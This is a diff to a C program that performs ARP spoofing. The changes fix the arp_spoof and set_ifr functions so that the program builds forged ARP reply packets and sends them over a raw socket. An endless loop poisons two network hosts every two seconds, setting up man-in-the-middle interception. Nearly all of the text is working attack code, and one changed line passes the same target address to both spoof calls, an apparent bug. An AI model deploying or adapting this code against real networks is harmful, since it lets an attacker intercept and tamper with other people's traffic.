@@ -75,8 +75,8 @@ int initialize_inject(const char *gateway_ip, char *target_ip, char *own_ip, con
     
     printf("Starting spoofing\n");
     while (1) {
-        arp_spoof(mac_addr_one, my_mac, target_ip_one, ifname);
-        arp_spoof(mac_addr_two, my_mac, target_ip_two, ifname);
+        arp_spoof(mac_addr_one, my_mac, my_ip, target_ip_one, ifname);
+        arp_spoof(mac_addr_two, my_mac, my_ip, target_ip_one, ifname);
         sleep(2);
     }    
     return 0;
@@ -94,7 +94,7 @@ void get_mac_addr(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *i
     const uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
     
     struct ifreq ifr;
-    set_ifr(&ifr, ifname);    
+    set_ifr(sock, &ifr, ifname);    
     
     struct sockaddr_ll addr = {0};
     addr.sll_family = AF_PACKET;
@@ -154,7 +154,7 @@ void get_mac_addr(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *i
     close(sock);
 }
 
-void arp_spoof(uint8_t *target_mac, uint8_t *own_mac, uint32_t target_ip, char *ifname);
+void arp_spoof(uint8_t *target_mac, uint8_t *own_mac, uint32_t own_ip, uint32_t target_ip, char *ifname) {
 
     int sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
     if (sock == -1) {
@@ -165,37 +165,44 @@ void arp_spoof(uint8_t *target_mac, uint8_t *own_mac, uint32_t target_ip, char *
     struct arp_header arp_hdr;
     struct ifreq ifr;
     
-    set_ifr(&ifr, ifname);    
+    set_ifr(sock, &ifr, ifname);    
     
-    arp_hdr->hardware_type = htons(ARPHRD_ETHER);
-    arp_hdr->protocol_type = htons(ETH_P_IP);
-    arp_hdr->hardware_size = MAC_LEN;
-    arp_hdr->protocol_size = IP_LEN;
-    arp_hdr->opcode = htons(ARPOP_REPLY); 
+    struct sockaddr_ll addr = {0};
+    addr.sll_family = AF_PACKET;
+    addr.sll_ifindex = ifr.ifr_ifindex;
+    addr.sll_halen = MAC_LEN;
+    addr.sll_protocol = htons(ETH_P_ARP);
+    memcpy(addr.sll_addr, target_mac, MAC_LEN);
     
-    memcpy(&arp_hdr->sha, own_mac, MAC_LEN);
-    memcpy(&arp_hdr->spa, &own_ip, IP_LEN);
-    memset(&arp_hdr->tha, target_one_mac, MAC_LEN);
-    memcpy(&arp_hdr->tpa, &target_one_ip, IP_LEN);
+    arp_hdr.hardware_type = htons(ARPHRD_ETHER);
+    arp_hdr.protocol_type = htons(ETH_P_IP);
+    arp_hdr.hardware_size = MAC_LEN;
+    arp_hdr.protocol_size = IP_LEN;
+    arp_hdr.opcode = htons(ARPOP_REPLY); 
     
-    if (sendto(sock, &arp_hdr, 0, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
+    memcpy(&arp_hdr.sha, own_mac, MAC_LEN);
+    memcpy(&arp_hdr.spa, &own_ip, IP_LEN);
+    memcpy(&arp_hdr.tha, target_mac, MAC_LEN);
+    memcpy(&arp_hdr.tpa, &target_ip, IP_LEN);
+    
+    if (sendto(sock, &arp_hdr, sizeof(struct arp_header), 0, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
         perror("sendto() failed");
         exit(1);
     }
 }
 
-void set_ifr(struct ifreg *ifr, char *ifname) {
+void set_ifr(int sd, struct ifreq *ifr, char *ifname) {
 
     int name_len = strlen(ifname); 
-    if (name_len < sizeof(ifr.ifr_name)) {
-        memcpy(ifr.ifr_name, ifname, name_len);
-        ifr.ifr_name[name_len] = 0;
+    if (name_len < sizeof(ifr->ifr_name)) {
+        memcpy(ifr->ifr_name, ifname, name_len);
+        ifr->ifr_name[name_len] = 0;
     } else {
         perror("Interface name is too long");
         exit(1);
     }
     
-    if (ioctl(sock, SIOCGIFINDEX, (void *)&ifr) == -1) {
+    if (ioctl(sd, SIOCGIFINDEX, ifr) == -1) {
         fprintf(stderr, "ioctl: flags %d errno %d/%s\n", SIOCGIFINDEX, errno, strerror(errno));
         perror("Error in ioctl()");
         exit(1);
